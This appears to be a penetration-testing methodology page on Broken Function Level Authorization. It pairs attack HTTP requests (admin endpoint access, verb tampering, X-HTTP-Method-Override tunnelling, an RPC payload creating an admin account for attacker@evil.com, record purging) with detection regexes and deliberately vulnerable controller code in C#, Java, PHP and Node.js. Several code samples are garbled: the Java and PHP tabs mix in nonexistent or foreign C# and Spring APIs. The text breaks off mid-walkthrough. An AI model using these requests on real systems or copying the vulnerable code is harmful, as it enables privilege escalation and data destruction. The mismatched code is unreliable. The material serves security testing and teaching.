# Broken Function Level Authorization

## Check List

## Methodology

### Black Box

#### Vertical Privilege Escalation via Admin Endpoint

{% stepper %}
{% step %}
Login as a normal user, Capture your API token
{% endstep %}

{% step %}
Attempt to access an admin-only endpoint

```http
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
If response returns user list instead of `403/401`, role validation is missing
{% endstep %}

{% step %}
If endpoint is accessible with a low-privileged token, function-level authorization is broken
{% endstep %}

{% step %}
If sensitive administrative functionality is exposed to non-admin user, vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Privileged Action via HTTP Method Manipulation

{% stepper %}
{% step %}
Login as normal user, Intercept a normal read-only request

```http
GET /api/users/1024 HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
Change HTTP method to privileged action

```http
DELETE /api/users/1024 HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
Send modified request
{% endstep %}

{% step %}
If deletion succeeds without admin privileges, function-level authorization is not enforced per HTTP method
{% endstep %}

{% step %}
If server validates authentication but not role-based function access, vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Hidden Admin Endpoint Discovery

{% stepper %}
{% step %}
Login as normal user, Browse JavaScript files

```http
GET /static/app.js HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Identify hidden admin endpoint reference

```hurl
/api/v1/admin/export-users
```
{% endstep %}

{% step %}
Directly request endpoint

```http
GET /api/v1/admin/export-users HTTP/1.1
Host: target.com
Authorization: Bearer user_token
```
{% endstep %}

{% step %}
If server responds with exported user data instead of access denied, role enforcement is missing
{% endstep %}

{% step %}
If backend relies only on UI restrictions and not server-side role checks, function-level authorization is broken
{% endstep %}
{% endstepper %}

***

#### Role Parameter Tampering

{% stepper %}
{% step %}
Login as normal user, Intercept privileged request structure

```http
POST /api/settings/update HTTP/1.1
Host: target.com
Authorization: Bearer user_token
Content-Type: application/json

{"feature":"maintenance","enabled":false}
```
{% endstep %}

{% step %}
Modify request by adding role field

```json
{"feature":"maintenance","enabled":true,"role":"admin"}
```
{% endstep %}

{% step %}
Send modified request, If privileged system configuration is changed without admin account, server trusts client input for function authorization
{% endstep %}

{% step %}
If administrative functionality is executed by non-admin user, Broken Function Level Authorization vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Authorization Bypass via Dynamic RPC Function Reflection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on unified, single-endpoint API architectures (e.g., `/api/v1/dispatch`, `/rpc`, or `/graphql`) where the HTTP method (POST) remains static and the requested action is encapsulated entirely within the JSON payload
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend API Gateway's routing and the core action-dispatching middleware
{% endstep %}

{% step %}
Identify the "Dynamic Dispatcher" architecture. To avoid writing hundreds of individual REST controllers, the enterprise engineers implemented a Remote Procedure Call (RPC) pattern. The frontend SPA sends a payload like `{"service": "UserService", "action": "getUserProfile", "args": {"id": 123}}`
{% endstep %}

{% step %}
Investigate the execution sink. The backend dispatcher reads the `service` and `action` strings. It utilizes native language Reflection (C#, Java) or dynamic object bracket notation (Node.js) to dynamically instantiate the target class and invoke the requested method
{% endstep %}

{% step %}
Analyze the Authorization boundary. The developer applied global Authentication middleware to the `/rpc` endpoint, ensuring only logged-in users can reach the dispatcher. However, because the endpoint handles _all_ traffic, they did not apply Function Level Authorization (Role-Based Access Control) at the routing layer
{% endstep %}

{% step %}
Discover the fatal trust assumption: The developer assumes that because administrative actions (e.g., `deleteTenant`, `promoteUser`) are not physically rendered as buttons in the standard user's UI, a standard user will never know the internal class and method names required to execute them. They rely entirely on "Security by Obscurity.
{% endstep %}

{% step %}
Understand the BFLA vulnerability: The dispatcher blindly executes whatever function name is provided in the JSON payload, provided the class and method exist in the codebase. Because there is no internal mapping asserting `if (action == 'deleteTenant' && user.role != 'ADMIN') throw Error`, standard users can invoke highly privileged backend functions
{% endstep %}

{% step %}
Formulate the Reflection BFLA payload. You must reverse-engineer or brute-force the internal administrative class and method names. (Often exposed in frontend source maps, leaked Swagger docs, or predictable naming conventions)
{% endstep %}

{% step %}
Construct the RPC payload: `{"service": "AdminService", "action": "deleteOrganizationalUnit", "args": {"orgId": "9918"}}`
{% endstep %}

{% step %}
Transmit the payload to the unified `/rpc` endpoint using your standard, low-privilege JWT
{% endstep %}

{% step %}
The API Gateway verifies your JWT. Authentication passes
{% endstep %}

{% step %}
The request reaches the Dynamic Dispatcher. The dispatcher dynamically resolves the `AdminService` class and invokes `deleteOrganizationalUnit`
{% endstep %}

{% step %}
Because the target function assumes authorization was handled upstream by the router, it blindly executes the database mutation. You have achieved devastating administrative execution via pure architectural obfuscation failure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Type\.GetType\(.*\.GetMethod\()|(GetMethod\([^)]*\)\.Invoke\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
(MethodUtils\.invokeMethod\()|(Class\.forName\(.*\)\.getMethod\()|(getDeclaredMethod\([^)]*\)\.invoke\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(call_user_func_array\()|(call_user_func\()|(\$[a-zA-Z0-9_]+->\{\$[a-zA-Z0-9_]+\}\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(\[req\.body\.method\]\()|([a-zA-Z0-9_]+\[req\.body\.method\]\()|(Reflect\.apply\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"Type\.GetType\(.*\.GetMethod\(|GetMethod\([^)]*\)\.Invoke\("
```
{% endtab %}

{% tab title="Java" %}
```regexp
"MethodUtils\.invokeMethod\(|Class\.forName\(.*\)\.getMethod\(|getDeclaredMethod\([^)]*\)\.invoke\("
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"call_user_func_array\(|call_user_func\(|\\$[a-zA-Z0-9_]+->\{\\$[a-zA-Z0-9_]+\}\("
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"\[req\.body\.method\]\(|[a-zA-Z0-9_]+\[req\.body\.method\]\(|Reflect\.apply\("
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[Authorize] // Only ensures the user is logged in
[HttpPost("/api/rpc")]
public async Task<IActionResult> RpcDispatch([FromBody] RpcRequest request)
{
    // [1]
    // [2]
    var assembly = Assembly.GetExecutingAction();
    var type = assembly.GetTypes().FirstOrDefault(t => t.Name == request.ServiceName);
    
    if (type == null) return BadRequest("Service not found");

    var instance = Activator.CreateInstance(type);
    var method = type.GetMethod(request.MethodName);

    // [3]
    // [4]
    // Dynamically invokes the method. If the requested method is "PurgeDatabase",
    // the application executes it without verifying [Authorize(Roles="Admin")] 
    // because reflection bypasses standard ASP.NET routing filters.
    var result = method.Invoke(instance, new object[] { request.Args });

    return Ok(result);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Authorize
@PostMapping("/api/rpc")
public ResponseEntity<?> RpcDispatch(@RequestBody RpcRequest request)
{
    // [1]
    // [2]
    var assembly = Assembly.GetExecutingAction();
    var type = assembly.getTypes().stream()
        .filter(t -> t.getName().equals(request.getServiceName()))
        .findFirst()
        .orElse(null);

    if (type == null) return BadRequest("Service not found");

    var instance = type.getDeclaredConstructor().newInstance();
    var method = type.getMethod(request.getMethodName());

    // [3]
    // [4]
    // Dynamically invokes the method. If the requested method is "PurgeDatabase",
    // the application executes it without verifying [Authorize(Roles="Admin")]
    // because reflection bypasses standard ASP.NET routing filters.
    var result = method.invoke(instance, request.getArgs());

    return Ok(result);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class RpcController extends Controller
{
    public function dispatch(Request $request)
    {
        // [1]
        // [2]
        $service = $request->input('service');
        $method = $request->input('method');
        $args = $request->input('args');

        $className = "App\\Services\\" . $service;

        // [3]
        // [4]
        if (class_exists($className) && method_exists($className, $method)) {
            $instance = new $className();
            
            // Evaluates the function dynamically based on untrusted user input
            $result = call_user_func_array([$instance, $method], [$args]);
            return response()->json($result);
        }

        return response()->json(['error' => 'Invalid RPC call'], 400);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const services = {
    UserService: require('./services/UserService'),
    AdminService: require('./services/AdminService')
};

// [1]
// [2]
// Global endpoint requiring basic authentication
router.post('/api/rpc/dispatch', requireAuth, async (req, res) => {
    const { serviceName, methodName, args } = req.body;

    // [3]
    // [4]
    // Fatal Flaw: The dispatcher blindly invokes the requested function using bracket notation.
    // There is no Function Level Authorization enforcing that the authenticated user 
    // actually holds the specific role required to execute the requested method.
    try {
        const ServiceClass = services[serviceName];
        const instance = new ServiceClass();
        
        // Executes the function dynamically
        const result = await instance[methodName](args); 
        res.json({ success: true, data: result });
    } catch (err) {
        res.status(500).send("Execution failed");
    }
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture abandons strict REST controllers in favor of a centralized RPC dispatcher, funneling all application traffic through a single URI, \[2] To secure the endpoint, engineers apply blanket Authentication middleware. This guarantees identity but conflates identity with authority, \[3] The architecture relies heavily on dynamic language features (Reflection, metaprogramming) to translate JSON payloads into physical server-side execution directives, \[4] The execution sink. The developers failed to implement a Function Level Access Control matrix within the dispatcher logic. They incorrectly assumed that backend functions were securely isolated simply because they lacked explicit HTTP route definitions (`GET /api/admin/...`). The attacker bypasses this "Security by Obscurity" by manipulating the dynamic execution payload. By explicitly naming an administrative service and function, the attacker forces the dispatcher to instantiate and execute highly classified logic. The underlying function, assuming authorization was managed by the gateway, complies without resistance, resulting in a total horizontal and vertical privilege escalation

```http
// 1. Attacker authenticates as a basic user.
// 2. Attacker interacts with a standard feature (e.g., updating their profile) and observes the RPC pattern.

POST /api/rpc/dispatch HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>
Content-Type: application/json

{"serviceName": "UserService", "methodName": "updateProfile", "args": {"theme": "dark"}}

// 3. Attacker analyzes open-source components, leaked Swagger docs, or simply guesses 
//    standard administrative service names (e.g., AdminService, TenantService, SystemService).
// 4. Attacker constructs a malicious payload targeting a highly privileged backend function.

POST /api/rpc/dispatch HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>
Content-Type: application/json

{
  "serviceName": "SystemAdministrationService", 
  "methodName": "forceProvisionAdminAccount", 
  "args": {
    "email": "attacker@evil.com",
    "password": "Password1!"
  }
}

// 5. The API Gateway authenticates the token.
// 6. The Dispatcher instantiates `SystemAdministrationService`.
// 7. The Dispatcher invokes `forceProvisionAdminAccount`.
// 8. The function executes, generating a new master administrative account for the attacker.
```
{% endstep %}

{% step %}
To minimize routing boilerplate and accelerate frontend development, platform engineers implemented a unified Dynamic RPC Dispatcher. This architecture transformed the backend into a reflection-driven execution engine, dynamically mapping JSON strings to internal class methods. The systemic security failure arose from a profound breakdown in Function Level Authorization boundaries. The engineers deployed perimeter authentication but entirely neglected internal, role-based method evaluation, relying instead on the assumption that client-side UI limitations would prevent the discovery of administrative endpoints. The attacker bypassed the graphical interface, interacting directly with the JSON transport layer. By meticulously forging the service and method definitions, the attacker coerced the dispatcher into invoking restricted backend logic. The dynamic execution engine, devoid of a centralized access control matrix, blindly executed the attacker's administrative commands, resulting in comprehensive application compromise through architectural obfuscation failure
{% endstep %}
{% endstepper %}

***

#### Perimeter Verb Evasion via REST Method Tunneling Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise environments utilizing heavy, external Web Application Firewalls (WAFs) or API Gateways (e.g., AWS API Gateway, F5, Cloudflare) that sit in front of modern application frameworks (e.g., Express, Spring Boot, ASP.NET)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway's routing rules and the backend application's middleware configuration
{% endstep %}

{% step %}
Identify the "Perimeter-Enforced REST Security" architecture. To centralize security, enterprise DevSecOps teams define authorization rules directly in the API Gateway infrastructure. For example, the Gateway enforces a rule: `Allow GET /api/v1/users/* for Role: User` and `Allow DELETE /api/v1/users/* for Role: Admin`
{% endstep %}

{% step %}
Investigate the Backend Framework configuration. The backend application (e.g., Node.js or Spring Boot) receives the routed traffic. The internal controllers simply execute the action, assuming the API Gateway already enforced the HTTP Verb authorization
{% endstep %}

{% step %}
Analyze the legacy compatibility middleware. To support ancient web browsers or strict corporate firewalls that only permit `GET` and `POST` HTTP requests, the backend developer enabled a "Method Override" middleware (e.g., `method-override` in Express, or `HiddenHttpMethodFilter` in Spring)
{% endstep %}

{% step %}
Discover the fatal execution desynchronization: The API Gateway and the Backend Framework evaluate the HTTP request utilizing two entirely different parsing engines
{% endstep %}

{% step %}
Understand the vulnerability: The API Gateway rigidly inspects the physical HTTP protocol Verb. However, the Backend Framework is configured to inspect specific HTTP headers (e.g., `X-HTTP-Method-Override`) or query parameters (e.g., `?_method=DELETE`) and _virtually rewrite_ the incoming request before routing it to the controller
{% endstep %}

{% step %}
Formulate the Method Tunneling payload. You must satisfy the strict perimeter Gateway logic while deceiving the internal backend&#x20;
{% endstep %}

{% step %}
Identify an administrative REST endpoint you wish to exploit (e.g., `DELETE /api/v1/users/991`)
{% endstep %}

{% step %}
Construct an HTTP `POST` request to the target URI
{% endstep %}

{% step %}
Inject the method-override header: `X-HTTP-Method-Override: DELETE`
{% endstep %}

{% step %}
Transmit the payload using your low-privilege JWT
{% endstep %}

{% step %}
The API Gateway intercepts the request. It evaluates the physical verb: `POST`. It checks its ruleset: `Allow POST /api/v1/users/* for Role: User`. The Gateway approves the request and forwards it to the backend
{% endstep %}

{% step %}
The Backend Framework receives the `POST` request. Its method-override middleware intercepts the traffic, detects the `X-HTTP-Method-Override: DELETE` header, and virtually transforms the internal request object into a `DELETE` request
{% endstep %}

{% step %}
The backend framework routes the mutated request to the `deleteUser` controller function. Because the backend relies on the Gateway for authorization, it blindly executes the deletion, achieving devastating Broken Function Level Authorization via protocol desynchronization

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(builder\.UseHttpMethodOverride\(\))|(app\.UseHttpMethodOverride\(\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(HiddenHttpMethodFilter)|(new\s+HiddenHttpMethodFilter\(\))|(OrderedHiddenHttpMethodFilter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$request->setMethod\(\$_POST\['_method'\]\))|(\$request->getMethod\(\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(app\.use\(methodOverride\())|(methodOverride\(['"]_method['"]\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"builder\.UseHttpMethodOverride\(\)|app\.UseHttpMethodOverride\(\)"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"HiddenHttpMethodFilter|new\s+HiddenHttpMethodFilter\(\)|OrderedHiddenHttpMethodFilter"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"\\$request->setMethod\(\\\$_POST\['_method'\]\)|\\$request->getMethod\(\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"app\.use\(methodOverride\(|methodOverride\(['\"]_method['\"]\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    // [1]
    // [2]
    // Enables HTTP Method overriding via the X-Http-Method-Override header.
    // The framework will transparently re-route the request.
    app.UseHttpMethodOverride();

    app.UseRouting();
    
    // Authorization is applied, but the specific REST verb permissions 
    // are enforced upstream by the AWS API Gateway.
    app.UseAuthorization();

    app.UseEndpoints(endpoints =>
    {
        endpoints.MapControllers();
    });
}

// Controller
[HttpDelete("/api/v1/users/{id}")]
public async Task<IActionResult> DeleteUser(int id)
{
    // Executes blindly, relying on the perimeter defense
    await _userService.DeleteAsync(id);
    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Configuration
public class WebConfig {

    // [1]
    // [2]
    // Spring Boot's filter allows tunneling PUT, DELETE, PATCH via a POST request
    // containing a hidden '_method' parameter or specific headers.
    @Bean
    public HiddenHttpMethodFilter hiddenHttpMethodFilter() {
        return new HiddenHttpMethodFilter();
    }
}

@RestController
public class UserController {

    // [3]
    // [4]
    // BFLA vulnerability: No internal @PreAuthorize("hasRole('ADMIN')") annotation.
    // The developer relied completely on the F5 WAF to block unauthorized DELETE verbs.
    @DeleteMapping("/api/v1/users/{id}")
    public ResponseEntity<?> deleteUser(@PathVariable Long id) {
        userRepository.deleteById(id);
        return ResponseEntity.ok().build();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebConfig
{

    // [1]
    // [2]
    // Spring Boot's filter allows tunneling PUT, DELETE, PATCH via a POST request
    // containing a hidden '_method' parameter or specific headers.
    public function hiddenHttpMethodFilter()
    {
        return new HiddenHttpMethodFilter();
    }
}


class UserController
{

    // [3]
    // [4]
    // BFLA vulnerability: No internal @PreAuthorize("hasRole('ADMIN')") annotation.
    // The developer relied completely on the F5 WAF to block unauthorized DELETE verbs.
    public function deleteUser($id)
    {
        $this->userRepository->deleteById($id);
        return ResponseEntity::ok()->build();
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const methodOverride = require('method-override');

const app = express();

// [1]
// [2]
// Developer enables method override to support legacy clients.
// This middleware mutates the req.method property internally based on headers.
app.use(methodOverride('X-HTTP-Method-Override'));

// [3]
// [4]
// The backend controller assumes the API Gateway blocked unauthorized DELETE requests.
// It lacks its own internal RBAC evaluation (e.g., requireRole('ADMIN')).
app.delete('/api/v1/users/:id', async (req, res) => {
    
    await db.User.destroy({ where: { id: req.params.id } });
    
    res.send({ status: 'Deleted' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The enterprise infrastructure centralizes its Role-Based Access Control (RBAC) at the network edge, configuring the Web Application Firewall (WAF) or API Gateway to enforce security policies strictly based on HTTP REST Verbs and URI paths, \[2] To support legacy architectural requirements or restrictive corporate proxies, backend engineers deploy Method Override middleware, \[3] The architecture relies on an assumed harmony between the perimeter defense and the internal routing engine, leading developers to omit redundant, function-level role checks within the backend controllers, \[4] The execution sink. The API Gateway and the backend web framework employ fundamentally divergent protocol parsing engines. The Gateway rigidly analyzes the immutable TCP/HTTP transport layer (the physical `POST` verb). Conversely, the backend framework utilizes an abstract, highly mutable software layer that actively rewrites the request's internal state based on discretionary HTTP headers. The attacker exploits this desynchronization (HTTP Request Smuggling/Tunneling). By encapsulating an administrative `DELETE` directive inside an authorized, low-privilege `POST` envelope, the attacker bypasses the rigid perimeter. The backend middleware unpacks the envelope, executes the virtual verb override, and routes the traffic directly to the unprotected administrative function

```http
// 1. Attacker (Basic User) discovers an administrative endpoint they wish to exploit.
// Target: DELETE /api/v1/users/991 (Administrator Account)

// 2. Attacker attempts the physical DELETE request.
DELETE /api/v1/users/991 HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>

// 3. The API Gateway explicitly blocks the request.
// HTTP/1.1 403 Forbidden (Gateway Response)

// 4. The attacker constructs the Method Tunneling payload. They utilize an allowed 
//    HTTP verb (POST) and inject the override header.

POST /api/v1/users/991 HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>
X-HTTP-Method-Override: DELETE
Content-Type: application/json
Content-Length: 2

{}

// 5. The API Gateway evaluates the physical protocol.
//    Rule: Allow POST /api/v1/users/* for Role: User.
//    The Gateway approves the request and proxies it internally.

// 6. The Express/Spring backend receives the POST request.
// 7. The Method Override middleware evaluates the 'X-HTTP-Method-Override' header.
// 8. The backend virtually rewrites 'req.method = DELETE'.
// 9. The backend router maps the request to the 'deleteUser' controller.
// 10. The controller executes, permanently deleting the target user.
```
{% endstep %}

{% step %}
To enforce centralized, scalable access controls, infrastructure architects offloaded RESTful Verb authorization to the perimeter API Gateway. Concurrently, backend engineers deployed method-overriding middleware to circumvent physical network limitations for legacy clients. This architectural divergence created a severe parsing asymmetry. The API Gateway evaluated the immutable physical transport properties, while the backend framework operated on a virtualized, header-driven routing state. Believing the perimeter was impregnable, developers omitted internal function-level authorization boundaries. The attacker capitalized on this layered blindness by tunneling an unauthorized, destructive HTTP verb inside an explicitly authorized wrapper. The API Gateway, blind to the application-layer headers, authorized the wrapper. The backend framework unpacked the override directive and routed the payload directly to the restricted administrative controller. This protocol desynchronization entirely neutralized the enterprise's edge-based Role-Based Access Control, resulting in critical Broken Function Level Authorization
{% endstep %}
{% endstepper %}

***

#### Implicit Function Exposure via Shared Base Controller Inheritance

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on massive, Object-Oriented MVC architectures (e.g., ASP.NET MVC, Spring Boot, Laravel) that heavily utilize class inheritance to eliminate code duplication
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend routing configuration and controller class hierarchy
{% endstep %}

{% step %}
Identify the "Auto-Routing" or "Convention over Configuration" architecture. Modern frameworks automatically map public methods within a Controller class to executable HTTP endpoints without requiring explicit manual route declarations (e.g., the method `public void Delete()` in `UserController` automatically becomes `/api/User/Delete`)
{% endstep %}

{% step %}
Investigate the Class Inheritance structure. To streamline development, engineers create a generic `BaseController` or `CrudController` that contains standard logic (e.g., `Get`, `Update`, `Delete`, `ExportData`). Both the `AdminController` and the `UserController` inherit from this base class
{% endstep %}

{% step %}
Analyze the Authorization mechanics. The developer applies Role-Based Access Control (RBAC) via class-level attributes/annotations. For instance, `[Authorize(Roles="User")]` is applied to `UserController`, and `[Authorize(Roles="Admin")]` is applied to `AdminController`
{% endstep %}

{% step %}
Discover the fatal Object-Oriented routing flaw: Developers assume that by omitting a specific function (like `Delete()`) from the source code of the `UserController`, the route simply does not exist for standard users. They fail to understand how the framework's reflection-based routing engine interacts with class inheritance
{% endstep %}

{% step %}
Understand the vulnerability: Because the `UserController` extends the `BaseController`, it inherently possesses all the public methods of its parent. The framework's auto-router discovers the inherited `Delete()` method and registers it as a valid endpoint: `/api/User/Delete`. Crucially, because the class-level attribute on `UserController` is `[Authorize(Roles="User")]`, this highly destructive inherited function is now fully authorized for execution by any basic user
{% endstep %}

{% step %}
Formulate the Controller Inheritance payload. You do not need complex parameters; you must deduce the hidden, inherited route structure
{% endstep %}

{% step %}
Analyze the API responses or documentation. If the Admin API exposes `/api/Admin/PurgeAllRecords`, test if the base framework pattern applies to the user controller by guessing `/api/User/PurgeAllRecords`
{% endstep %}

{% step %}
Alternatively, if a `BaseController` handles generic actions like `exportTenantData()`, attempt to invoke it through the low-privilege controller namespace
{% endstep %}

{% step %}
Execute the HTTP request to the inherited endpoint using a standard user JWT
{% endstep %}

{% step %}
The framework's routing engine accepts the request, mapping it to the inherited method residing in the base class
{% endstep %}

{% step %}
The framework evaluates the authorization metadata attached to the _child_ class (`UserController`). It validates your basic user role and grants execution
{% endstep %}

{% step %}
The base class method executes, wiping databases, exporting highly classified telemetry, or mutating global state. You have achieved Broken Function Level Authorization strictly through Object-Oriented architectural bleed

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(class\s+[a-zA-Z0-9_]+Controller\s*:\s*(Base|Crud|Admin)Controller)|(\[Authorize\(Roles\s*=\s*['"]User['"]\)\]\s*public\s+class)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller)|(@PreAuthorize\("hasRole\('USER'\)"\)\s*public\s+class)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"class\s+[a-zA-Z0-9_]+Controller\s*:\s*(Base|Crud|Admin)Controller|\[Authorize\(Roles\s*=\s*['\"]User['\"]\)\]\s*public\s+class"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller|@PreAuthorize\(\"hasRole\('USER'\)\"\)\s*public\s+class"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"class\s+[a-zA-Z0-9_]+Controller\s+extends\s+(Base|Crud|Admin)Controller"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// [1]
// [2]
// Shared Base Controller containing highly privileged, destructive administrative actions
public abstract class BaseCrudController : ControllerBase
{
    protected readonly ApplicationDbContext _dbContext;

    protected BaseCrudController(ApplicationDbContext context) { _dbContext = context; }

    // [3]
    // [4]
    // Fatal Flaw: This method is public. Any controller inheriting this base class 
    // will automatically expose this method as an executable HTTP route.
    [HttpDelete("PurgeAllRecords")]
    public async Task<IActionResult> PurgeAllRecords()
    {
        _dbContext.Records.RemoveRange(_dbContext.Records);
        await _dbContext.SaveChangesAsync();
        return Ok("Database wiped.");
    }
}

// Low-Privilege Controller
// The developer applies the 'User' role to the class, intending to secure 
// the explicitly written GetProfile method.
[Authorize(Roles = "User")]
[Route("api/[controller]")]
public class UserController : BaseCrudController
{
    public UserController(ApplicationDbContext context) : base(context) { }

    [HttpGet("GetProfile")]
    public IActionResult GetProfile() { return Ok("User Profile"); }
    
    // The developer forgets that PurgeAllRecords is inherited here.
    // The framework generates the route: DELETE /api/User/PurgeAllRecords
    // Because the class authorizes 'User', the method is exposed to basic users.
}
```
{% endtab %}

{% tab title="Java" %}
```java
// [1]
// [2]
// Generic repository controller handling broad data extraction
public abstract class BaseApiController<T> {

    @Autowired
    protected JpaRepository<T, Long> repository;

    // [3]
    // [4]
    // Exposes a global export feature intended only for administrative auditing
    @GetMapping("/exportData")
    public List<T> exportAllData() {
        return repository.findAll();
    }
}

// [Authorize] at the class level permits standard users
@RestController
@RequestMapping("/api/v1/user")
@PreAuthorize("hasRole('USER')")
public class UserController extends BaseApiController<User> {

    @GetMapping("/dashboard")
    public String dashboard() { return "Dashboard"; }

    // Spring's HandlerMapping registers GET /api/v1/user/exportData
    // The @PreAuthorize("hasRole('USER')") satisfies the security requirement.
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// [1]
// [2]
class BaseApiController extends Controller
{
    // [3]
    // [4]
    // High-impact function designed to be called by Admin subclasses
    public function flushSystemCache()
    {
        Cache::flush();
        return response()->json(['status' => 'Cache wiped']);
    }
}

// Low-privilege controller extending the base class
class UserController extends BaseApiController
{
    public function __construct()
    {
        // Applies middleware to ensure only users access this controller
        $this->middleware('role:user');
    }

    public function showProfile()
    {
        return response()->json(['name' => 'John']);
    }

    // If Laravel's router is configured with Route::controller() or implicit routing,
    // /user/flushSystemCache becomes an accessible, low-privilege execution vector.
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Shared Base Controller containing highly privileged, destructive administrative actions
class BaseCrudController
{
    constructor(dbContext)
    {
        this._dbContext = dbContext;
    }

    // [3]
    // [4]
    // Fatal Flaw: This method is public. Any controller inheriting this base class
    // will automatically expose this method as an executable HTTP route.
    async PurgeAllRecords(req, res)
    {
        await this._dbContext.Records.removeRange(this._dbContext.Records);
        await this._dbContext.saveChangesAsync();

        return res.send("Database wiped.");
    }
}

// Low-Privilege Controller
// The developer applies the 'User' role to the class, intending to secure
// the explicitly written GetProfile method.
class UserController extends BaseCrudController
{
    constructor(dbContext)
    {
        super(dbContext);
    }

    GetProfile(req, res)
    {
        return res.send("User Profile");
    }

    // The developer forgets that PurgeAllRecords is inherited here.
    // The framework generates the route: DELETE /api/User/PurgeAllRecords
    // Because the class authorizes 'User', the method is exposed to basic users.
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application architecture relies on strict Object-Oriented Programming (OOP) paradigms, utilizing deep class inheritance to manage massive, repetitive codebases, \[2] To eliminate boilerplate CRUD logic, engineers author centralized Base Controllers that house generic database manipulation and administrative audit functions, \[3] The architecture leverages automated Framework Routing (Convention over Configuration), dynamically mapping public methods within controller classes to accessible HTTP endpoints without requiring explicit manual declarations, \[4] The execution sink. The developers evaluated security through a purely lexical lens, assuming that if a method was not physically typed within the subclass's file, it did not exist in the routing table. They fundamentally failed to synchronize Object-Oriented inheritance mechanics with Web API routing auto-discovery. By placing a destructive, administrative function within a globally inherited base class, the developers inadvertently copied that function into every child controller. When the developer applied low-privilege, class-level authorization to the child controller, they systematically downgraded the security requirements for the inherited administrative function. The attacker exploits this by navigating to the newly synthesized route, forcing the framework to authenticate the standard user while successfully executing the destructive, inherited administrative logic

```http
// 1. Attacker authenticates as a standard user.
// 2. Attacker interacts with their profile API and observes the route structure.

GET /api/User/GetProfile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>

// 3. Attacker analyzes the open-source framework, decompiles the thick client, 
//    or reviews historical API documentation. They notice that the Admin API uses
//    the route /api/Admin/PurgeAllRecords.
// 4. Deducing that both controllers likely inherit from the same polymorphic base class,
//    the attacker reconstructs the implicit route targeting the User controller.

DELETE /api/User/PurgeAllRecords HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <basic_user_token>

// 5. The ASP.NET routing engine maps the URL to the UserController class.
// 6. The framework executes the authorization filter. 
//    Rule: [Authorize(Roles="User")]. Result: PASS.
